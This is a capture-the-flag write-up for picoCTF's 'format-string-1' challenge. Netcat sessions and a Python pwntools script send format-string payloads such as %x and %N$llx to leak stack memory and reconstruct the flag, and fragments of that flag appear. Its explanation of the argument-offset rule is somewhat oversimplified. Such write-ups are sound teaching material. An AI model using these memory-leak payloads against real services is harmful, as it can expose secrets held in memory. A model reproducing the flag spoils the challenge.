# Description
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

# Context
On connecting via netcat:
```bash
❯ nc mimas.picoctf.net 62487
Give me your order and I'll read it back to you:
1
Here's your order: 1
Bye!
```

We can also know that the binary is 64-bit:
```
❯ objdump -a format-string-1

format-string-1:     file format elf64-x86-64
format-string-1

```
# Solving
## Trying some weird inputs
Since the name of the challenge is "format-string-1", lets try using some format char inputs.
### Reading some unset bytes from ``buf``
```
❯ nc mimas.picoctf.net 62487
Give me your order and I'll read it back to you:
%x%x%x%x%x
Here's your order: 40211804076a00021d7880
Bye!
```
### Reading the arg ``buf`` using ``buf``?
Since this is a 64-bit program, the argument for the `printf` function
can be accessed using the `%5$s` format string. The syntax is `%<arg number>$<format>` for 32-bit programs, and `%<arg_number+5>$<format>` for 64-bit.
```bash
❯ nc mimas.picoctf.net 62487
Give me your order and I'll read it back to you:
hello%5$s
Here's your order: hellohello%5$s

Bye!
```

### Exploring the stack
We saw that we can read the argument `buf` using `%5$s`, but we can go
even further and explore the stack to find some interesting values.
This is possible because in case the `printf` function needs more arguments
those will be read from the stack. We can use the `%<arg_number>$lx` format with a higher number to read the stack.

The following python code will help us explore the stack this way:

It will connect to the server, send a payload, and return the response cutting the added part of the response, in order to get only the bytes read from memroy. The response will be decoded from hex to utf-8 if it has 16 bytes (In other case it means we red something else, mostly alignment padding).

```python
def connect_send(payload):
    io = remote("mimas.picoctf.net", 61211)
    print(str(io.recvline()))
    io.sendline(payload)
    recvd = io.recvall()
    recvd = recvd.replace(b"Here's your order: ", b"")
    recvd = recvd.replace(b"\nBye!\n", b"")
    return try_string(recvd)

def try_string(hex_string):
    if len(hex_string)>=16:
        try:
            decoded_string = codecs.decode(hex_string, "hex").decode("utf-8")
            print("!!!!!!!!!!!!!!!! Decoded string: ", decoded_string)
            return decoded_string
        
        except Exception as e:
            print("Error decoding string: ", e)

def explore_the_stack():
    findings = []
    for i in range(20):
        pos_offseted = 5+i
        finding = connect_send(b"%"+str(pos_offseted).encode()+b"$llx")
        if(finding != None):
            findings.append(finding)

    print(findings)
```
The execution of the code will give us the following output:

['{FTCocip', '5_14m1n4', '4x4_31y7', 'e5_g41f_', '}4bcb76', '#\x00\x00\x00\x07', ' ni3t0rP']

Clearly some of the flag is revealed in the output, if we reverse the first element in the array.
The flag would be the first five elements reversed. The output is reversed because the endianess of the memory
but since each character is 1 byte, data doesn't break reading this way, just gets reversed.

This leaves us with a single question:
Is the last item in the array the secret ingredient?